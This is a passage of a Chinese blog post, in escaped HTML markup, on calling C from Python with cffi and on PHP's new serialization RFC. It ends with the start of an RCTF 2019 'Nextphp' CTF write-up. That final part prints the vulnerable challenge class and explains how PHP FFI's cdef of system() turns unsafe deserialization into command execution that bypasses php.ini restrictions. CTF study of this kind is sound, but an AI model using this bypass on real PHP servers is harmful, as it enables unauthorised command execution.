&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello, world&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">Tmul&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后调用&lt;code>ffi.verify()&lt;/code>在Python中加载和使用，不过还需要额外声明函数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#d88200"> int Tadd(int a, int b);
&lt;/span>&lt;span style="color:#d88200"> void Tprint(void);
&lt;/span>&lt;span style="color:#d88200"> int Tmul(int a, int b);
&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">lib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">verify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sources&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;uu.c&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tadd&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tprint&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Tmul&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202180822923.png" alt="image-20211202180822923">&lt;/p>
&lt;p>以上方式都是在线api模式，cffi还支持离线api模式，比如下面这个demo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;span style="color:#111">ffibuilder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#d88200"> double sqrt(double x);
&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># 需要的头文件&lt;/span>
&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_libmath&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#d88200"> #include &amp;lt;math.h&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">library_dirs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[],&lt;/span>
&lt;span style="color:#111">libraries&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;m&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">ffibuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">verbose&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python build_cffi.py
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">_libmath&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">lib&lt;/span>
&lt;span style="color:#75715e"># 直接调用c函数&lt;/span>
&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">lib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sqrt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4.5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">F&lt;/span>&lt;span style="color:#d88200">&amp;#34;The square root of 4.5 is &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python test.py
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202173047579.png" alt="image-20211202173047579">&lt;/p>
&lt;p>可以看到这里先用一个py文件调用.h来编译生成.so和.c，然后在另一个py文件中调用.c即可&lt;/p>
&lt;p>或者还有第三种方式，在Python中使用外部已经定义好的c库函数；这里使用&lt;a href="https://github.com/wolever">wolever&lt;/a>/&lt;a href="https://github.com/wolever/python-cffi-example">python-cffi-example&lt;/a>来演示（&lt;del>就不复制粘贴了捏&lt;/del> 就粘就粘&lt;/p>
&lt;p>首先是一个&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/fnmatch.h#L1-L18">fnmatch.h&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202184827657.png" alt="image-20211202184827657">&lt;/p>
&lt;p>注意7 8 9行要改一下的，根据/usr/include/fnmatch.h改&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202185217525.png" alt="image-20211202185217525">&lt;/p>
&lt;p>这是&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/cffi_example/build_fnmatch.py#L1">build_fnmatch.py&lt;/a>，用于生成模块在fnmatch.py中使用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">cffi&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">FFI&lt;/span>
&lt;span style="color:#111">ffi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">FFI&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi_example._fnmatch&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75715e"># Since we are calling fnmatch directly no custom source is necessary. We&lt;/span>
&lt;span style="color:#75715e"># need to #include &amp;lt;fnmatch.h&amp;gt;, though, because behind the scenes cffi&lt;/span>
&lt;span style="color:#75715e"># generates a .c file which contains a Python-friendly wrapper around&lt;/span>
&lt;span style="color:#75715e"># ``fnmatch``:&lt;/span>
&lt;span style="color:#75715e"># static PyObject *&lt;/span>
&lt;span style="color:#75715e"># _cffi_f_fnmatch(PyObject *self, PyObject *args) {&lt;/span>
&lt;span style="color:#75715e"># ... setup ...&lt;/span>
&lt;span style="color:#75715e"># result = fnmatch(...);&lt;/span>
&lt;span style="color:#75715e"># return PyInt_FromLong(result);&lt;/span>
&lt;span style="color:#75715e"># }&lt;/span>
&lt;span style="color:#d88200">&amp;#34;#include &amp;lt;fnmatch.h&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75715e"># The important thing is to inclue libc in the list of libraries we&amp;#39;re&lt;/span>
&lt;span style="color:#75715e"># linking against:&lt;/span>
&lt;span style="color:#111">libraries&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dirname&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;fnmatch.h&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compile&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>一个&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/setup.py#L1-L33">setup.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">setuptools&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">find_packages&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dirname&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi-example&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">version&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">classifiers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Development Status :: 4 - Beta&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: 2&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: 3&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: Implementation :: PyPy&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;License :: OSI Approved :: BSD License&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">packages&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">find_packages&lt;/span>&lt;span style="color:#111">(),&lt;/span>
&lt;span style="color:#111">install_requires&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi&amp;gt;=1.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">setup_requires&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi&amp;gt;=1.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">cffi_modules&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#34;./build_fnmatch.py:ffi&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">],&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后的cffi_modules指定了需要生成ffi实例的文件&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">pyhon setup.py install
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190508189.png" alt="image-20211202190508189">&lt;/p>
&lt;p>没想到是个报错，仔细看一下原因，解决方法是把之前的fnmatch.h中的偏移换成16进制&lt;/p>
&lt;p>再次执行就好了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190825764.png" alt="image-20211202190825764">&lt;/p>
&lt;p>可以看到这种方式比之前生成的文件都要多，相当于安装了一个模块&lt;/p>
&lt;p>然后是一个test_fnmatch.py，注意这里直接用给出的文件还是会报错，把下图高亮的地方换成0x1&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202191447689.png" alt="image-20211202191447689">&lt;/p>
&lt;p>再执行就好了&lt;/p>
&lt;p>cffi和ctypes还有很多的花活，鉴于我的代码能力一般（c和python都是勉强够用的水平），就不班门弄斧了，更多的东西还是看官方文档比较靠谱（链接贴在最后了&lt;/p>
&lt;p>————什么？为什么FFI in PHP介绍的还不如FFI in Python的多？&lt;/p>
&lt;p>emmmmm 这个嘛 才不会说是因为懒呢&lt;/p>
&lt;h2 id="serializable">Serializable&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism&lt;/a> | php7.4启用&lt;/li>
&lt;/ul>
&lt;p>已有的反序列化魔术方法总是有很多安全问题，这个提议新增了&lt;code>__serialize()&lt;/code>，&lt;code>__unserialize()&lt;/code>，&lt;code>serialize()&lt;/code>，&lt;code>unserialize()&lt;/code>和&lt;code>Serializable()&lt;/code>&lt;/p>
&lt;p>&lt;code>serialize()&lt;/code>检查到&lt;code>__serialize()&lt;/code>的存在后将在序列化之前优先执行，返回序列化形式的数组，如有错抛出TypeError；如果同时有&lt;code>__serialize()&lt;/code>和&lt;code>__sleep()&lt;/code>，后者将被忽略；如果对象实现了&lt;code>Serializable()&lt;/code>接口，接口的&lt;code>serialize()&lt;/code>将被忽略，类中的&lt;code>__serialize()&lt;/code>将被调用；反序列化时触发&lt;code>__unserialize()&lt;/code>&lt;/p>
&lt;p>————好勾八复杂的，建议直接看文档&lt;/p>
&lt;h2 id="rctf-2019nextphp">[RCTF 2019]Nextphp&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;print_r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__serialize&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__set&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果熟读以上三个文档，这个题就很好出了&lt;/p>
&lt;p>我们可以把func设为&lt;code>FFI:cdef&lt;/code>，arg设为&lt;code>int system(char *command)&lt;/code>来执行c代码绕过php.ini中的限制；同时由于Serializable的种种新特性（出题人也在这里设了坑），我们在构造poc时要删除&lt;code>__serialize()&lt;/code>，防止直接return进坑里了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
